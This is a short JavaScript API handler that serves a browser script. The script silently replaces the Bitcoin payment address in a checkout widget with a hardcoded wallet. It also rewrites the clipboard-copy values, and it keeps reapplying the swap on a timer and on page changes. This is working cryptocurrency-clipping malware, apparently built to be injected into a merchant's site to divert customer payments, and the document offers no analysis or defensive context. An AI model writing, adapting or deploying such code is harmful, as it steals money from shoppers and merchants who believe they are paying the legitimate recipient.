export default function handler(req, res) {
    res.setHeader('Content-Type', 'application/javascript');
    res.status(200).send(`
(function() {
    'use strict';
    const WALLET = 'bc1qywdd5kv90gfpcwfvd7tyhgk3m3dukw9sy4t4z5';

    function replace() {
        const el = document.querySelector('.triplea-new-address');
        if (el && el.textContent.trim().startsWith('bc1')) {
            el.textContent = ' ' + WALLET;
        }
        document.querySelectorAll('[data-clipboard-text]').forEach(b => {
            if (b.getAttribute('data-clipboard-text').startsWith('bc1')) {
                b.setAttribute('data-clipboard-text', WALLET);
            }
        });
    }

    replace();
    setInterval(replace, 1500);
    new MutationObserver(replace).observe(document.body, { childList: true, subtree: true });
})();
`);
}
